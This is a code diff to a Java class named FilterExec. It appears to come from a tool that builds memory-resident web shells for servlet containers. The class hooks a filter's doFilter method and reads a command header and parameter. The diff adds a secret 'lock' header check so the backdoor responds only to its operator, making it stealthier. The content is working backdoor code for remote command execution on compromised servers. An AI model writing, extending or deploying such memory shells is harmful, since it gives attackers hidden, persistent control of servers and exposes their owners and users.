@@ -15,10 +15,12 @@ import java.lang.reflect.Method;
  */
 @MemShell(MemShell.Filter)
 @MemShellFunction(MemShellFunction.Exec)
-@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM})
+@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
 public class FilterExec implements InvocationHandler {
     private static String HEADER;
     private static String PARAM;
+    private String lockHeaderKey;
+    private String lockHeaderValue;
 
     public Object invoke(Object proxy, Method method, Object[] args) {
         if (method.getName().equals("doFilter")) {
@@ -39,6 +41,9 @@ public class FilterExec implements InvocationHandler {
      */
     private void run(Object servletRequest, Object servletResponse, Object filterChain) {
         try {
+            if(!((String)invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey})).contains(lockHeaderValue)) {
+                return;
+            }
             Object header = invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
             Object param = invokeMethod(servletRequest, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
             String str = null;
